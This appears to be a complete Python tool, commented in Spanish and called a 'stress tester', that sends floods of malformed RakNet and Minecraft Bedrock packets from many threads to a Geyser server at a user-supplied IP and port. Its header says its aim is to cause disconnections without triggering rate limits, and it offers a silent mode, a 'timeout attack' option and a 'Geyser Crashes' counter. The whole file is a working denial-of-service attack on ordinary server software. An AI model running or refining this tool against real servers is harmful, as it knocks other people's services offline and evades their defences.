#!/usr/bin/env python3
"""
🚀 GEYSER STRESS TESTER - Versión Mejorada (Turbo)
Simula clientes con problemas de red para causar desconexiones en Geyser
sin activar rate limits y con mínimo ruido en consola (opcional).
"""

import socket
import struct
import random
import time
import threading
import sys
import signal
import argparse
from datetime import datetime

# ============================
# VARIABLES GLOBALES
# ============================
total_packets = 0
total_bytes = 0
active_connections = 0
running = True
error_packets = 0
connection_attempts = 0
server_errors_triggered = 0

stats_lock = threading.Lock()
conn_lock = threading.Lock()

# ============================
# CONSTANTES RAKNET
# ============================
RAKNET_FLAG_VALID = 0x80
RAKNET_FLAG_ACK = 0x40
RAKNET_FLAG_NAK = 0x20
RAKNET_MAGIC = bytes([
    0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
    0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78
])

# ============================
# GENERADORES DE PAQUETES (ORIGINALES + NUEVOS)
# ============================

# ----- Paquetes originales (conservados) -----
def generate_buggy_open_connection_request1():
    buf = bytearray(17)
    buf[0] = 0x05
    buf[1:17] = RAKNET_MAGIC
    return bytes(buf)

def generate_almost_correct_open_connection_request1():
    buf = bytearray(20)
    buf[0] = 0x05
    buf[1:17] = RAKNET_MAGIC
    buf[17] = 0x00
    buf[18] = 0x05
    return bytes(buf)

def generate_buggy_open_connection_request2():
    buf = bytearray(30)
    buf[0] = 0x07
    buf[1:17] = RAKNET_MAGIC
    buf[17] = 192
    buf[18] = 168
    buf[19] = 1
    buf[20:22] = struct.pack('>H', 19132)
    buf[22:24] = struct.pack('>H', 1500)
    buf[24:28] = struct.pack('>I', random.getrandbits(32))
    return bytes(buf)

def generate_buggy_connection_request():
    buf = bytearray(18)
    buf[0] = 0x09
    buf[1:9] = struct.pack('>Q', random.getrandbits(64))
    buf[9:17] = struct.pack('>Q', int(time.time() * 1000))
    return bytes(buf)

def generate_corrupt_magic_ping():
    buf = bytearray(35)
    buf[0] = 0x01
    buf[1:9] = struct.pack('>Q', int(time.time() * 1000))
    buf[9:25] = RAKNET_MAGIC
    buf[9] = 0x01
    buf[10] = 0xFE
    buf[25] = 0x00
    return bytes(buf)

def generate_out_of_range_datagram():
    buf = bytearray(50)
    buf[0] = 0x80
    buf[1:5] = struct.pack('>I', 0xFFFFFFF0)
    buf[5] = 0xFF
    buf[6] = 0xFF
    buf[7:11] = struct.pack('>I', 0x7FFFFFFF)
    for i in range(11, len(buf)):
        buf[i] = random.randint(0, 255)
    return bytes(buf)

def generate_invalid_ack_packet():
    buf = bytearray(30)
    buf[0] = 0xC0
    buf[1:3] = struct.pack('>H', 0xFFFF)
    for i in range(3, len(buf), 4):
        buf[i:i+4] = struct.pack('>I', random.getrandbits(32))
    return bytes(buf)

def generate_invalid_nak_packet():
    buf = bytearray(25)
    buf[0] = 0xA0
    buf[1:3] = struct.pack('>H', 0x0001)
    buf[3:7] = struct.pack('>I', 1)
    buf[7:11] = struct.pack('>I', 1)
    return bytes(buf)

def generate_invalid_packet_pair():
    buf = bytearray(40)
    buf[0] = 0x90
    buf[1:5] = struct.pack('>I', 100)
    buf[5:9] = struct.pack('>I', 50)
    buf[9:27] = b'INVALID_PACKET_PAIR'
    return bytes(buf)

def generate_valid_handshake():
    buf = bytearray(28)
    buf[0] = 0x05
    buf[1:17] = RAKNET_MAGIC
    buf[17] = 0x00
    buf[18:20] = struct.pack('>H', 1500)
    return bytes(buf)

# ----- NUEVOS PAQUETES MALFORMADOS (para más variedad) -----

def generate_open_connection_reply_1_corrupt():
    """ID 0x06: Open Connection Reply 1 con campos inconsistentes"""
    buf = bytearray(28)
    buf[0] = 0x06
    buf[1:17] = RAKNET_MAGIC
    buf[17:21] = struct.pack('>I', random.getrandbits(32))  # Server GUID (4 bytes en vez de 8)
    buf[21:23] = struct.pack('>H', 1500)  # MTU correcto
    buf[23:25] = struct.pack('>H', 0xFFFF)  # Encryption flags inválidos
    return bytes(buf)

def generate_unconnected_ping_corrupt():
    """ID 0x01: Unconnected Ping con ping ID enorme"""
    buf = bytearray(25)
    buf[0] = 0x01
    buf[1:9] = struct.pack('>Q', 0xFFFFFFFFFFFFFFFF)  # Ping ID max
    buf[9:25] = RAKNET_MAGIC
    return bytes(buf)

def generate_unconnected_pong_corrupt():
    """ID 0x03: Unconnected Pong con datos truncados"""
    buf = bytearray(30)
    buf[0] = 0x03
    buf[1:9] = struct.pack('>Q', random.getrandbits(64))
    buf[9:25] = RAKNET_MAGIC
    buf[25:27] = struct.pack('>H', 1000)  # Longitud de datos enorme
    # Datos insuficientes, causará buffer underflow
    return bytes(buf)

def generate_open_connection_request_2_corrupt():
    """ID 0x07: Request 2 con GUID mal alineado"""
    buf = bytearray(34)
    buf[0] = 0x07
    buf[1:17] = RAKNET_MAGIC
    # IP correcta (4 bytes)
    buf[17] = 127
    buf[18] = 0
    buf[19] = 0
    buf[20] = 1
    buf[21:23] = struct.pack('>H', 19132)
    buf[23:25] = struct.pack('>H', 1500)
    buf[25:33] = struct.pack('>Q', random.getrandbits(64))  # GUID (8 bytes) correcto
    # Añadir un byte extra para causar desalineación en lectura posterior
    buf[33] = 0xFF
    return bytes(buf)

def generate_connection_request_accepted_corrupt():
    """ID 0x10: Connection Request Accepted con dirección mal formada"""
    buf = bytearray(100)
    buf[0] = 0x10
    buf[1:17] = RAKNET_MAGIC
    buf[17:25] = struct.pack('>Q', random.getrandbits(64))  # Client GUID
    buf[25:33] = struct.pack('>Q', random.getrandbits(64))  # System index (debería ser 4 bytes)
    # Dirección incompleta
    buf[33] = 4  # IPv4
    buf[34] = 127
    buf[35] = 0
    buf[36] = 0
    # Falta el puerto
    return bytes(buf)

def generate_new_incoming_connection_corrupt():
    """ID 0x13: New Incoming Connection con timestamp inválido"""
    buf = bytearray(100)
    buf[0] = 0x13
    buf[1:17] = RAKNET_MAGIC
    # Dirección local y remota idénticas (deberían ser diferentes)
    buf[17:21] = struct.pack('>I', 0x7F000001)  # 127.0.0.1
    buf[21:23] = struct.pack('>H', 19132)
    buf[23:27] = struct.pack('>I', 0x7F000001)
    buf[27:29] = struct.pack('>H', 19132)
    # MTU incorrecto
    buf[29:31] = struct.pack('>H', 0xFFFF)
    # Timestamp de conexión futuro
    buf[31:39] = struct.pack('>Q', 0x7FFFFFFFFFFFFFFF)
    return bytes(buf)

def generate_disconnect_notification():
    """ID 0x15: Disconnect notification (válido pero inesperado)"""
    buf = bytearray(1)
    buf[0] = 0x15
    return bytes(buf)

def generate_incompatible_protocol_version():
    """ID 0x19: Incompatible protocol version con versión incorrecta"""
    buf = bytearray(6)
    buf[0] = 0x19
    buf[1:5] = struct.pack('>I', 999)  # Versión incompatible
    buf[5] = 0x00  # Magic? pero no se espera
    return bytes(buf)

# ----- Paquetes de juego Bedrock corruptos (para atacar capa superior) -----

def generate_bedrock_login_corrupt():
    """Paquete Login (ID 0x01 de Minecraft) con datos corruptos"""
    # Simula un paquete de juego dentro de un frame RakNet
    # Estructura: [Frame header] [Minecraft packet]
    frame = bytearray(100)
    frame[0] = 0x84  # Reliable + fragmented? (flags arbitrarios)
    frame[1:5] = struct.pack('>I', random.getrandbits(32))  # Sequence number
    # Dentro, ponemos un Login packet malformado
    # Login ID = 0x01
    frame[5] = 0x01
    # Login data (protocol version incorrecto)
    frame[6:10] = struct.pack('>I', 999)  # Protocol version
    frame[10] = 0xFF  # Datos extra
    return bytes(frame[:30])

def generate_bedrock_play_status():
    """Paquete PlayStatus (ID 0x02) con status inválido"""
    frame = bytearray(10)
    frame[0] = 0x84
    frame[1:5] = struct.pack('>I', random.getrandbits(32))
    frame[5] = 0x02  # PlayStatus ID
    frame[6] = 0xFF  # Status out of range
    return bytes(frame)

def generate_bedrock_disconnect():
    """Paquete Disconnect (ID 0x05) con mensaje corrupto"""
    frame = bytearray(50)
    frame[0] = 0x84
    frame[1:5] = struct.pack('>I', random.getrandbits(32))
    frame[5] = 0x05
    frame[6:8] = struct.pack('>H', 0xFFFF)  # Longitud del mensaje enorme
    return bytes(frame[:20])

# Lista completa de generadores de paquetes buggy (originales + nuevos)
buggy_generators = [
    generate_buggy_open_connection_request1,
    generate_almost_correct_open_connection_request1,
    generate_buggy_open_connection_request2,
    generate_buggy_connection_request,
    generate_corrupt_magic_ping,
    generate_out_of_range_datagram,
    generate_invalid_ack_packet,
    generate_invalid_nak_packet,
    generate_invalid_packet_pair,
    generate_open_connection_reply_1_corrupt,
    generate_unconnected_ping_corrupt,
    generate_unconnected_pong_corrupt,
    generate_open_connection_request_2_corrupt,
    generate_connection_request_accepted_corrupt,
    generate_new_incoming_connection_corrupt,
    generate_disconnect_notification,
    generate_incompatible_protocol_version,
    generate_bedrock_login_corrupt,
    generate_bedrock_play_status,
    generate_bedrock_disconnect,
]

# ============================
# CLIENTE SIMULADO MEJORADO
# ============================
def simulate_buggy_client(target, client_id, min_delay, max_delay, silent):
    global active_connections, connection_attempts, total_packets, total_bytes
    global error_packets, server_errors_triggered, running

    with conn_lock:
        active_connections += 1

    normal_mode = True
    error_count = 0

    while running:
        with stats_lock:
            connection_attempts += 1

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)

            # Alternar entre modo normal y buggy (más variado)
            if error_count > 5:
                normal_mode = True
                error_count = 0
            elif random.random() < 0.3:  # 30% de probabilidad de bug
                normal_mode = False
                error_count += 1

            if normal_mode:
                # Paquete válido (handshake o ping normal)
                if random.random() < 0.5:
                    packet = generate_valid_handshake()
                else:
                    packet = generate_unconnected_ping_corrupt()  # Pero aquí usaríamos uno válido; mejor usar el válido.
                    # Para no complicar, usar el handshake válido siempre.
                    packet = generate_valid_handshake()
                sock.sendto(packet, target)
                with stats_lock:
                    total_packets += 1
                    total_bytes += len(packet)
            else:
                # Seleccionar un generador buggy aleatorio
                generator = random.choice(buggy_generators)
                packet = generator()
                sock.sendto(packet, target)
                with stats_lock:
                    total_packets += 1
                    total_bytes += len(packet)
                    error_packets += 1
                    server_errors_triggered += 1

            sock.close()

        except Exception:
            pass

        # Retardo configurable entre envíos
        time.sleep(random.uniform(min_delay, max_delay))

    with conn_lock:
        active_connections -= 1

# ============================
# SIMULADOR DE PROBLEMAS DE RED (mejorado)
# ============================
def simulate_network_issues(target, min_delay, max_delay):
    global total_packets, total_bytes, running

    network_issues = [
        "high_packet_loss",
        "buffer_overflow",
        "mtu_mismatch",
        "fragmentation_error",
        "checksum_failure",
        "out_of_order",
        "duplicate_packets",
    ]
    issue_index = random.randint(0, len(network_issues) - 1)
    current_issue = network_issues[issue_index]

    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)

            if current_issue == "high_packet_loss":
                packet = generate_valid_handshake()
                if random.randint(0, 9) > 6:
                    packet = packet[:random.randint(10, len(packet)-1)]
                sock.sendto(packet, target)

            elif current_issue == "buffer_overflow":
                oversized = bytearray(2000)
                handshake = generate_valid_handshake()
                oversized[:len(handshake)] = handshake
                sock.sendto(bytes(oversized[:1500 + random.randint(0, 499)]), target)

            elif current_issue == "mtu_mismatch":
                packet = bytearray(28)
                packet[0] = 0x05
                packet[1:17] = RAKNET_MAGIC
                packet[17] = 0x00
                mtu = random.randint(500, 2500)
                packet[18:20] = struct.pack('>H', mtu)
                sock.sendto(bytes(packet), target)

            elif current_issue == "fragmentation_error":
                packet = generate_out_of_range_datagram()
                sock.sendto(packet, target)

            elif current_issue == "checksum_failure":
                packet = bytearray(generate_valid_handshake())
                for _ in range(3):
                    pos = random.randint(0, len(packet) - 1)
                    packet[pos] = random.randint(0, 255)
                sock.sendto(bytes(packet), target)

            elif current_issue == "out_of_order":
                packet = generate_invalid_packet_pair()
                sock.sendto(packet, target)

            elif current_issue == "duplicate_packets":
                packet = generate_valid_handshake()
                for _ in range(3):
                    sock.sendto(packet, target)
                    time.sleep(0.01)

            sock.close()

            if random.randint(0, 19) == 0:
                issue_index = (issue_index + 1) % len(network_issues)
                current_issue = network_issues[issue_index]

        except Exception:
            pass

        time.sleep(random.uniform(min_delay, max_delay))

# ============================
# ESTADÍSTICAS (opcional, solo si no silent)
# ============================
def show_network_diagnostics(silent):
    global total_packets, total_bytes, error_packets, active_connections
    global connection_attempts, server_errors_triggered, running

    if silent:
        return  # No mostrar estadísticas

    last_packets = 0
    last_errors = 0
    start_time = time.time()

    while running:
        time.sleep(3)

        with stats_lock:
            current_packets = total_packets
            current_bytes = total_bytes
            current_errors = error_packets

        with conn_lock:
            current_conns = active_connections

        current_attempts = connection_attempts
        current_server_errors = server_errors_triggered

        elapsed = time.time() - start_time
        pps = (current_packets - last_packets) / 3.0
        eps = (current_errors - last_errors) / 3.0

        success_rate = 0.0
        if current_attempts > 0:
            success_rate = (current_packets / current_attempts) * 100.0

        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.write(f"📡 [NETWORK DIAGNOSTIC] Time: {elapsed:.0f}s | Clients: {current_conns} | "
                         f"Pkts: {current_packets} ({pps:.1f}/s) | "
                         f"Errors: {current_errors} ({eps:.1f}/s) | "
                         f"Success: {success_rate:.1f}% | Geyser Crashes: {current_server_errors}")
        sys.stdout.flush()

        last_packets = current_packets
        last_errors = current_errors

# ============================
# MANEJADOR DE SEÑALES
# ============================
def signal_handler(sig, frame):
    global running
    print("\n\n🛑 DETENIENDO PRUEBA DE ESTRÉS...")
    running = False

# ============================
# FUNCIÓN PRINCIPAL
# ============================
def main():
    global running

    parser = argparse.ArgumentParser(description="Geyser Stress Tester - Versión Mejorada")
    parser.add_argument("ip", help="IP del servidor Geyser")
    parser.add_argument("port", type=int, help="Puerto del servidor Geyser")
    parser.add_argument("clients", type=int, help="Número de clientes simulados")
    parser.add_argument("--min-delay", type=float, default=0.1, help="Retardo mínimo entre envíos (segundos, por cliente)")
    parser.add_argument("--max-delay", type=float, default=1.0, help="Retardo máximo entre envíos (segundos, por cliente)")
    parser.add_argument("--silent", action="store_true", help="Modo silencioso (sin estadísticas en consola)")
    parser.add_argument("--no-buggy", action="store_true", help="Usar solo paquetes válidos (timeout attack)")
    args = parser.parse_args()

    target = (args.ip, args.port)
    clients = args.clients
    min_delay = args.min_delay
    max_delay = args.max_delay
    silent = args.silent
    no_buggy = args.no_buggy

    random.seed(time.time())

    signal.signal(signal.SIGINT, signal_handler)

    if not silent:
        print("🚀 INICIANDO PRUEBA DE ESTRÉS GEYSER (VERSIÓN TURBO)")
        print("==================================================")
        print(f"🎯 Target: {args.ip}:{args.port}")
        print(f"👥 Clientes simulados: {clients}")
        print(f"⏱️  Retardo entre envíos: {min_delay}-{max_delay} s")
        print(f"🤫 Modo silencioso: {'SÍ' if silent else 'NO'}")
        print(f"🔧 Usar solo paquetes válidos: {'SÍ' if no_buggy else 'NO'}")
        print("")
        print("📊 Monitoreo activado (pulsa Ctrl+C para detener)")
        print("")

    # Iniciar hilo de estadísticas (si no es silencioso)
    stats_thread = threading.Thread(target=show_network_diagnostics, args=(silent,), daemon=True)
    stats_thread.start()

    # Iniciar clientes simulados
    threads = []
    for i in range(clients):
        if no_buggy:
            # Modo solo paquetes válidos (ataque de timeout)
            thread = threading.Thread(target=simulate_network_issues, args=(target, min_delay, max_delay), daemon=True)
        else:
            # Modo mixto (70% buggy, 30% problemas de red) - igual que original pero con más variedad
            if random.random() < 0.7:
                thread = threading.Thread(target=simulate_buggy_client, args=(target, i, min_delay, max_delay, silent), daemon=True)
            else:
                thread = threading.Thread(target=simulate_network_issues, args=(target, min_delay, max_delay), daemon=True)

        thread.start()
        threads.append(thread)
        time.sleep(0.01)

    if not silent:
        print(f"✅ {clients} clientes simulados iniciados")
        print("")

    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False

    time.sleep(2)

    if not silent:
        print("\n📊 INFORME FINAL DE LA PRUEBA:")
        print(f"   • Total paquetes enviados: {total_packets}")
        error_rate = (error_packets / total_packets * 100) if total_packets > 0 else 0
        print(f"   • Paquetes con errores: {error_packets} ({error_rate:.1f}%)")
        print(f"   • Errores de servidor provocados: {server_errors_triggered}")
        print(f"   • Intentos de conexión: {connection_attempts}")

if __name__ == "__main__":
    main()